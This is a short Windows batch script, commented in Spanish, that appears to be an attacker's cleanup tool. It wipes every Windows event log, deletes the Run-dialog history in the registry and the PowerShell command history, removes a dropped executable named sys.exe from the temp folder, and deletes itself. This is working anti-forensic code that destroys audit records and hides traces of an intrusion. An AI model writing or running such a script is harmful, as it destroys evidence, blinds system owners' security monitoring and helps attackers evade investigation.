@echo off
:: 1. Borrar todos los Logs de Eventos de Windows (Requiere Admin)
for /F "tokens=*" %%G in ('wevtutil.el') do (wevtutil cl "%%G")

:: 2. Limpiar el historial de 'Ejecutar' (RunMRU)
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f

:: 3. Borrar el historial de comandos de PowerShell
del /q /s /f %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

:: 4. Eliminar el instalador temporal si quedó alguno
del /f /q %TEMP%\sys.exe

:: 5. Autodestrucción del propio script de limpieza
(goto) 2>nul & del "%~f0"
